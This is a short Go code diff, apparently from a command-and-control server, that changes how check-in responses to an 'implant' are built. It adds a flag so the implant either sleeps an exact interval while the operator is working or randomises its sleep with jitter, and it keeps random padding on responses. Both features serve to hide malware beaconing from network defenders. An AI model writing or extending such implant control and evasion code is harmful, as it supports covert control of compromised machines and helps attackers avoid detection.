@@ -215,10 +215,17 @@ func cloneBytes(b []byte) []byte {
 }
 
 // buildCheckinResponse appends the adaptive-interval hint (0x44) and the size
-// pad to the encoded task TLVs. nextIntervalSec is authoritative for the
-// implant's next sleep; 0 means "keep current".
-func buildCheckinResponse(taskPayload []byte, nextIntervalSec uint32, padLen int) []byte {
+// pad to the encoded task TLVs. nextIntervalSec is the sleep base; 0 means
+// "keep current". exact tells the implant to sleep that many seconds with no
+// jitter (operator is working). Idle hints leave exact false so the implant
+// multiplies by uniform(0.5, 3).
+func buildCheckinResponse(taskPayload []byte, nextIntervalSec uint32, exact bool, padLen int) []byte {
 	hint := binary.LittleEndian.AppendUint32(nil, nextIntervalSec)
+	flag := byte(0)
+	if exact {
+		flag = 1
+	}
+	hint = append(hint, flag)
 	items := []tlv{
 		{Type: tlvNextHint, Value: hint},
 		{Type: tlvPad, Value: randomBytes(padLen)},
